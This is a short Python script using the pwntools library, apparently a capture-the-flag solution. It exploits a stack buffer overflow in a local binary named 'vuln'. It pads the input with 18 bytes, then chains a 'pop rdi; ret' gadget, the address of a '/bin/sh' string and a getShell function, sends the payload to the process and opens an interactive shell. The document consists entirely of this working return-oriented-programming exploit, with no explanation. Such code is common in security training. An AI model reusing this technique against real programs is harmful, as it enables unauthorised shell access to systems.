from pwn import *
context.binary = elf = ELF("./vuln")

pop_rdi = p64(0x000000000040124b)# pop rdi; ret; gadget address
bin_sh = p64(next(elf.search(b"/bin/sh")))# "/bin/sh" string address
getShell = p64(elf.symbols["getShell"])# getShell() address

payload = b"A"*18
payload += pop_rdi
payload += bin_sh
payload += getShell

io = process(elf.path)
#gdb.attach(io)
io.sendline(payload)
io.interactive()
